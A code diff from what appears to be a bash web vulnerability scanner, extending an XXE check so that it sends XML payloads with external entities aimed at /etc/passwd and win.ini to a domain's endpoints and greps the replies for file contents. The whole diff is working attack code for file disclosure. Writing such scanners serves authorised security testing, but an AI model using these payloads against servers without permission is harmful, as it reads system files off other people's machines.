@@ -38,31 +38,36 @@ xxe_basic_injection() {
         "https://$domain/parse"
     )
 
-    local xxe_payload='<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root><data>&xxe;</data></root>'
+    # Test both Unix and Windows targets
+    declare -A xxe_probes
+    xxe_probes["file:///etc/passwd"]="root:x:|nobody:|daemon:"
+    xxe_probes["file:///c:/windows/win.ini"]="\\[extensions\\]|for 16-bit|MSDOS"
 
-    for url in "${xml_endpoints[@]}"; do
-        local status
-        status=$(get_http_status "$url")
-        if [[ "$status" =~ ^[2-4][0-9]{2}$ && "$status" != "404" ]]; then
-            local response
-            response=$(curl -s -m 10 -X POST "$url" \
-                -H "Content-Type: application/xml" \
-                -H "User-Agent: AWJUNAID/2.0" \
-                -d "$xxe_payload" 2>/dev/null || true)
+    for target_uri in "${!xxe_probes[@]}"; do
+        local xxe_payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"${target_uri}\">]><root><data>&xxe;</data></root>"
+        local detection_pattern="${xxe_probes[$target_uri]}"
 
-            if echo "$response" | grep -qE "root:x:|nobody:|daemon:"; then
-                echo "⚠️  [CRITICAL] XXE File Disclosure confirmed: $url"
-                echo "    CWE-611 | CVSS: 9.1 (Critical)"
-                echo "    Remediation: Disable external entity processing in XML parser"
-                ((XXE_VULN_COUNT++))
-            elif echo "$response" | grep -qiE "xml|entity|parse error"; then
-                echo "ℹ️  XML endpoint detected (further testing warranted): $url"
+        for url in "${xml_endpoints[@]}"; do
+            local status
+            status=$(get_http_status "$url")
+            if [[ "$status" =~ ^[2-4][0-9]{2}$ && "$status" != "404" ]]; then
+                local response
+                response=$(curl -s -m 10 -X POST "$url" \
+                    -H "Content-Type: application/xml" \
+                    -H "User-Agent: AWJUNAID/2.0" \
+                    -d "$xxe_payload" 2>/dev/null || true)
+
+                if echo "$response" | grep -qE "$detection_pattern"; then
+                    echo "⚠️  [CRITICAL] XXE File Disclosure confirmed: $url"
+                    echo "    Target: $target_uri"
+                    echo "    CWE-611 | CVSS: 9.1 (Critical)"
+                    echo "    Remediation: Disable external entity processing in XML parser"
+                    ((XXE_VULN_COUNT++))
+                elif echo "$response" | grep -qiE "xml|entity|parse error"; then
+                    echo "ℹ️  XML endpoint detected (further testing warranted): $url"
+                fi
             fi
-        fi
+        done
     done
     echo ""
 }
